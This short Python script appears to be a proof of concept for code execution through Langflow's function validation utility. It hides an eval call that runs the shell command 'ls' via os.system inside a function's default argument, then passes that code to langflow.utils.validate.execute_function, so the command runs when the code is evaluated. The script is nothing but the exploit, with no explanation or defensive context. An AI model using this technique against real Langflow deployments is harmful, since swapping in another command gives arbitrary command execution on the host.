import langflow

code = """
def x(y=eval('__import__("os").system("ls")')):
    pass
"""

langflow.utils.validate.execute_function(code, "x")